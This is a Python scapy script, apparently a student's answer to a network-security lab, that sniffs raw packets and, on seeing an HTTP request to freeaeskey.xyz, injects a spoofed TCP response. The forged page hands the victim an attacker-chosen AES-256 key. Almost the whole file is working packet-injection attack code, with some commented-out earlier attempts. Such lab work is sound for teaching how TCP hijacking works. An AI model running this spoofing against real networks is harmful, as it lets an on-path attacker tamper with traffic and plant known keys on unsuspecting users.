from sys import flags
from scapy.all import send, conf, L3RawSocket
from scapy.all import TCP,IP,Ether,Raw
import scapy
import socket

from scapy.sessions import DefaultSession


# Use this function to send packets
def inject_pkt(pkt):
    conf.L3socket=L3RawSocket
    send(pkt)

###
# edit this function to do your attack
###
remote_ip = '18.234.115.5' #ip address of freeaeskey.xyz
response_payload: str = 'HTTP/1.1 200 OK\r\nServer: nginx/1.14.0 (Ubuntu)\r\nDate: Tue, 26 Oct 2021 23:16:47 GMT\r\nContent-Type: text/html; charset=UTF-8\r\nContent-Length: 335\r\nConnection: close\r\n\r\n<html>\n<head>\n  <title>Free AES Key Generator!</title>\n</head>\n<body>\n<h1 style="margin-bottom: 0px">Free AES Key Generator!</h1>\n<span style="font-size: 5%">Definitely not run by the NSA.</span><br/>\n<br/>\n<br/>\nYour <i>free</i> AES-256 key: <b>4d6167696320576f7264733a2053717565616d697368204f7373696672616765</b><br/>\n</body>\n</html>'
response_bytes = bytes(response_payload, 'utf-8')
def handle_pkt(pkt: bytes):
    # print(response_bytes)
    
    sc_pkt = Ether(pkt)
    # sc_pkt.show()
    if sc_pkt.haslayer(IP): #was getting a weird error when a packet didnt have the ip layer
        # sc_pkt_src = sc_pkt[IP].src
        # sc_pkt_dst = sc_pkt[IP].dst
        # req_ack = 0
        if sc_pkt[IP].dst == remote_ip and sc_pkt.haslayer(Raw): #intercept the first GET request to freeaeskey.xyz
            # req_ack = sc_pkt[IP].ack
            # print('FOUND!!')
            raw_bytes_len = len(sc_pkt[Raw])
            resp_seq = sc_pkt[TCP].ack
            resp_ack = sc_pkt[TCP].seq + raw_bytes_len

            #IP(src, dest) / TCP(sport, dport, seq, ack) (source port and destination port) / Raw 
            # Ether(dst = sc_pkt[Ether].src, src = sc_pkt[Ether].dst) / 
            vuln_resp_pkt = IP(src = remote_ip, dst = sc_pkt[IP].src) / TCP(sport = sc_pkt[TCP].dport, dport = sc_pkt[TCP].sport, seq = resp_seq, ack = resp_ack, flags = 0x018) / Raw(response_bytes)
            # print('printing my packet!')
            pkt_bytes = bytes(vuln_resp_pkt)
            parsed_pkt = IP(pkt_bytes)
            # parsed_pkt.show()
            inject_pkt(parsed_pkt)
            pass
        # if req_ack != 0: #wait until theyve recieved the tcp before sending the vuln_resp 
        #     if sc_pkt[IP].seq == req_ack: # verify that they recieved the tcp ack 
        #         inject_pkt(parsed_pkt)

        # if sc_pkt[IP].src == remote_ip and sc_pkt.haslayer(Raw): #Response packet
        #     print("actual response")
        #     sc_pkt.show()
            

    # elif sc_pkt[IP].src == remote_ip and sc_pkt.haslayer(Raw):
    #     print('false')

 

    # vuln_key = '4d6167696320576f7264733a2053717565616d697368204f7373696672616765'
    # hex_packet = hex(pkt)
    # print(hex_packet)
    # http_hex = '48545450' #http chars in hex 
    # remote_ip = '18.234.115.5' #ip address of freeaeskey.xyz
    # hex_remote_ip = ip_to_hex(remote_ip)
    # aes_key_str = 'Your <i>free</i> AES-256 key:'
    # aes_key_hex = aes_key_str.encode('utf-8').hex()
    # if hex_remote_ip in hex_packet: # verify packet is sending or coming from freeaeskey.xyz
    #     print('Got a freeaes packet!')
    #     if http_hex in hex_packet: # verify packet is the http packet with info
    #         print('Got an http packet')
    #         if aes_key_hex in hex_packet:
    #             print('Got aes back!')
    #             start = hex_packet.find(aes_key_hex) + 33 #start index of returned aes key 
    #             stop = start + len(vuln_key)
    #             vuln_hex_packet = hex_packet[:start] + aes_key_hex + hex_packet[stop:] #insert vuln key into packet 
    #             #convert back into bytes 
    #             send(bytes(vuln_hex_packet,'utf-8'))

def main():
    s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, 0x0300)
    while True:
        pkt = s.recv(0xffff)
        handle_pkt(pkt)

if __name__=='__main__':
    main()
